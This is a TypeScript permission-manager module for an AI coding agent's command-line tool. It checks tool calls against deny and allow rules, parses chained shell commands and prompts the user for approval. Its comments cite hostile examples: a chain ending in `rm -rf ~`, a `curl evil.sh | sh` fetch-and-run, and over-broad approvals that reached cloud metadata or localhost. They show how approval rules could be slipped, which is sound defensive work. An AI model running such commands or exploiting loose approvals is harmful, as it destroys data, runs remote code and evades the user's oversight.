import readline from "node:readline";
import chalk from "chalk";
import type { ClawConfig } from "../config.js";
import { saveUserSetting } from "../config.js";
import type { PermissionDecision, PermissionMeta } from "../tools/types.js";

export type PermissionMode = ClawConfig["permissionMode"];

export type PermissionAnswer = "yes" | "no" | "always" | "save";

export type Prompter = (req: {
  tool: string;
  key: string;
  input: unknown;
}) => Promise<PermissionAnswer>;

interface Approval {
  pattern: string;
}

export class PermissionManager {
  private sessionAllows: Approval[] = [];
  private prompter: Prompter;
  constructor(private config: ClawConfig, prompter?: Prompter) {
    this.prompter = prompter ?? defaultReadlinePrompter();
  }

  setPrompter(p: Prompter) {
    this.prompter = p;
  }

  setMode(mode: PermissionMode) {
    this.config.permissionMode = mode;
  }

  get mode(): PermissionMode {
    return this.config.permissionMode;
  }

  async check(
    toolName: string,
    input: unknown,
    meta?: PermissionMeta
  ): Promise<PermissionDecision> {
    if (this.config.permissionMode === "bypassPermissions") return { allow: true };

    const { key, segmentKeys } = describeKeys(toolName, input);

    // Deny wins, and it is tested against EVERY command in a chain — otherwise
    // `deniedTools: ["Bash(rm:*)"]` would sit out `git status && rm -rf ~`.
    for (const candidate of [key, ...segmentKeys]) {
      if (matchesAny(candidate, this.config.deniedTools)) {
        return { allow: false, reason: `denied by config (${candidate})` };
      }
    }
    if (matchesAny(key, this.config.allowedTools)) return { allow: true };
    if (matchesAny(key, this.sessionAllows.map((a) => a.pattern))) return { allow: true };

    if (this.config.permissionMode === "acceptEdits") {
      if (toolName === "Write" || toolName === "Edit") return { allow: true };
    }
    if (this.config.permissionMode === "plan") {
      // Plan mode forbids changing things, not looking at them. WebFetch and
      // WebSearch carry needsPermission, so a blanket deny blocked the research
      // the plan-mode prompt explicitly tells the model to do.
      if (meta?.mutates === false) return { allow: true };
      return { allow: false, reason: "plan mode — propose changes instead of executing them" };
    }
    const answer = await this.prompter({ tool: toolName, key, input });
    if (answer === "yes") return { allow: true };
    if (answer === "always") {
      // Scope "always" to the described key (e.g. Bash(npm:*)), not the bare
      // tool name — otherwise approving one Bash command would whitelist
      // every future Bash invocation in the session.
      this.sessionAllows.push({ pattern: key });
      return { allow: true };
    }
    if (answer === "save") {
      this.config.allowedTools.push(key);
      saveUserSetting(this.config, "allowedTools", this.config.allowedTools);
      return { allow: true };
    }
    return { allow: false, reason: "user denied" };
  }
}

/**
 * The string a permission rule matches against, plus — for shell commands —
 * one key per command in the chain so the denylist can inspect all of them.
 */
export function describeKeys(tool: string, input: unknown): { key: string; segmentKeys: string[] } {
  if (tool === "Bash" && input && typeof (input as any).command === "string") {
    return describeBash((input as any).command as string);
  }
  if (tool === "WebFetch" && input && typeof (input as any).url === "string") {
    // Scope to the host. A bare "WebFetch" key meant one "always" answer
    // approved every later URL, including cloud metadata and localhost.
    let host: string;
    try {
      host = new URL((input as any).url).host || "(no host)";
    } catch {
      host = "(invalid url)";
    }
    return { key: `WebFetch(${host})`, segmentKeys: [] };
  }
  return { key: tool, segmentKeys: [] };
}

const MAX_CHAIN_KEY_LEN = 200;

/**
 * A prefix rule like `Bash(git:*)` may only ever stand for ONE command. The
 * previous key took the first whitespace token of the whole command line, so
 * approving `git status` minted a rule that also matched
 * `git status; curl evil.sh | sh`. Anything with shell control characters
 * therefore gets an exact-match `Bash(chain:…)` key, which no `:*` prefix rule
 * can match — so chains always re-prompt.
 */
function describeBash(command: string): { key: string; segmentKeys: string[] } {
  const segments = splitShellSegments(command);
  const segmentKeys = segments
    .map(commandWord)
    .filter((w) => w.length > 0)
    .map((w) => `Bash(${w}:*)`);
  if (segments.length <= 1 && !hasShellMetacharacters(command)) {
    return { key: segmentKeys[0] ?? `Bash(${command.trim()}:*)`, segmentKeys: [] };
  }
  const normalized = command.replace(/\s+/g, " ").trim().slice(0, MAX_CHAIN_KEY_LEN);
  return { key: `Bash(chain:${normalized})`, segmentKeys };
}

/**
 * The command word of a single simple command: leading `VAR=value` assignments
 * are dropped and the path is reduced to its basename, so `/bin/rm` and
 * `env FOO=1 rm` both key as `rm` and a deny rule on `rm` actually bites.
 */
function commandWord(segment: string): string {
  const words = segment.trim().split(/\s+/).filter(Boolean);
  let i = 0;
  while (i < words.length && /^[A-Za-z_][A-Za-z0-9_]*=/.test(words[i])) i++;
  const word = words[i] ?? "";
  const unquoted = word.replace(/^['"]|['"]$/g, "");
  const base = unquoted.split("/").pop() ?? unquoted;
  return base;
}

/**
 * Split on shell control operators that appear OUTSIDE quotes. Quote-awareness
 * keeps `grep "a|b"` a single simple command instead of forcing a prompt on
 * every pipe-shaped string literal.
 */
function splitShellSegments(command: string): string[] {
  const segments: string[] = [];
  let current = "";
  scanShell(command, (ch, isOperator) => {
    if (isOperator) {
      segments.push(current);
      current = "";
    } else {
      current += ch;
    }
  });
  segments.push(current);
  return segments.map((s) => s.trim()).filter(Boolean);
}

/**
 * True when the command carries anything that can run a second program or
 * redirect a stream: control operators, substitutions, or redirections. Those
 * commands never get a reusable prefix rule.
 */
function hasShellMetacharacters(command: string): boolean {
  let found = false;
  scanShell(command, (_ch, isOperator) => {
    if (isOperator) found = true;
  });
  return found;
}

const OPERATOR_CHARS = new Set([";", "|", "&", "\n", "`", "(", ")", "<", ">"]);

/**
 * Walk a command tracking quote state, reporting each character and whether it
 * is an unquoted shell operator. Command substitution is flagged inside double
 * quotes too, because the shell still expands it there.
 */
function scanShell(command: string, visit: (ch: string, isOperator: boolean) => void): void {
  let inSingle = false;
  let inDouble = false;
  for (let i = 0; i < command.length; i++) {
    const ch = command[i];
    if (inSingle) {
      if (ch === "'") inSingle = false;
      visit(ch, false);
      continue;
    }
    if (inDouble) {
      if (ch === "\\") {
        visit(ch, false);
        if (i + 1 < command.length) visit(command[++i], false);
        continue;
      }
      if (ch === '"') inDouble = false;
      const substitution = ch === "`" || (ch === "$" && command[i + 1] === "(");
      visit(ch, substitution);
      continue;
    }
    if (ch === "'") {
      inSingle = true;
      visit(ch, false);
      continue;
    }
    if (ch === '"') {
      inDouble = true;
      visit(ch, false);
      continue;
    }
    if (ch === "\\") {
      visit(ch, false);
      if (i + 1 < command.length) visit(command[++i], false);
      continue;
    }
    visit(ch, OPERATOR_CHARS.has(ch) || (ch === "$" && command[i + 1] === "("));
  }
}

// Permission rule syntax accepted by matchesAny:
//   "Read"            — exact tool name (matches the bare key "Read")
//   "Bash"            — any Bash invocation (matches "Bash(<anything>)")
//   "Bash:*"          — same as above (prefix wildcard)
//   "Bash(npm:*)"     — Bash where the first token starts with "npm"
//   "Bash(npm test)"  — exact described key
function matchesAny(key: string, patterns: string[]): boolean {
  for (const pat of patterns) {
    if (pat === key) return true;
    if (pat.endsWith(":*")) {
      const prefix = pat.slice(0, -2);
      if (key.startsWith(prefix)) return true;
    }
    if (!pat.includes("(") && key.startsWith(pat + "(")) return true;
  }
  return false;
}

function defaultReadlinePrompter(): Prompter {
  let rl: readline.Interface | null = null;
  const get = () => {
    if (!rl) rl = readline.createInterface({ input: process.stdin, output: process.stdout });
    return rl;
  };
  return ({ tool, key }) =>
    new Promise((resolve) => {
      const r = get();
      process.stdout.write(
        chalk.yellow(`\n? Allow ${chalk.bold(tool)} (${key})? `) +
          chalk.dim("[y]es / [n]o / [a]lways / [s]ave: ")
      );
      r.question("", (answer) => {
        const a = answer.trim().toLowerCase();
        if (a === "y" || a === "yes") return resolve("yes");
        if (a === "a" || a === "always") return resolve("always");
        if (a === "s" || a === "save") return resolve("save");
        resolve("no");
      });
    });
}
